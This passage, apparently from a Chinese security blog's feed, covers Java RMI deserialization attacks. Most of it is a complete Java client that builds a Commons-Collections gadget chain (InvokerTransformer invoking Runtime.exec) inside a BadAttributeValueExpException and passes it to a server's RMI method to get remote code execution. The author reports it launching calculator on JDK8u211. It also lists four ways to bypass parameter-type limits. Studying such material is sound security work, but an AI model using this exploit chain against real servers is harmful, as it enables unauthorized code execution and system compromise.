org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                            new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                            new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                            new Class[]&#123;String.class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">            TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span><br><span class="line">            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);</span><br><span class="line">            Field valfield = poc.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            valfield.setAccessible(true);</span><br><span class="line">            valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">            hello.sayPayload(poc);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>同样的恶意客户端先通过getRegistry获取注册中心（服务端）并lookup绑定的hello。随后构造恶意类并调用绑定的方法，即可传恶意序列化数据使服务端RCE。</p></blockquote><p>我在JDK8u211的版本下能成功执行弹出服务端的计算器，如下所示：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/11.png" alt></p><p>然而在实际使用场景很少有参数是Object类型的，而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String)，具体有如下四种bypass的思路：</p><blockquote><p>际使用场景很少有参数是Object类型：即是说服务端很少有人会写返回类型是Object型的方法的。</p></blockquote><ul><li>将java.rmi包的代码复制到新包，并在新包中修改相应的代码</li><li>将调试器附加到正在运行的客户端，并在序列化之前替换这些对象</li><li>使用诸如Javassist这样的工具修改字节码</li><li>通过实现代理替换网络流上已经序列化的对象</li></ul><p>未完待续…</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> </li><li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a> </li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a> </li><li><a href="https://xz.aliyun.com/t/7264#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7264#toc-2</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;反序列化之RMI&quot;&gt;&lt;a href=&quot;#反序列化之RMI&quot; class=&quot;headerlink&quot; title=&quot;反序列化之RMI&quot;&gt;&lt;/a&gt;反序列化之RMI&lt;/h1&gt;&lt;p&gt;前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
